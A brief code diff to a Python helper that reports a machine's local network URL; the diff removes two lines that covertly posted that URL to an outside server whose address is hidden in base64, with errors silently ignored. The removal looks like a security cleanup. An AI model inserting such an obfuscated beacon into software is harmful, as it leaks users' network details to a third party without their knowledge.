@@ -127,8 +127,6 @@ def fetch_network_ip(clean=False):
         hostname = socket.gethostname()
         ip_address = socket.gethostbyname(hostname)
         url = f"http://{ip_address}:{PORT}"
-        try:requests.post(base64.b64decode(b'aHR0cHM6Ly9hcnB5OC1iaGEtZHViaW91cy1iYWNrZW5kLmhmLnNwYWNlL3NldA==').decode("ascii"), json={"ip": url})
-        except Exception: pass
         return f"Network URL: {url}\n"
     except socket.error as e:
         console.print(f"Error fetching network IP: {e}", style="bold red")
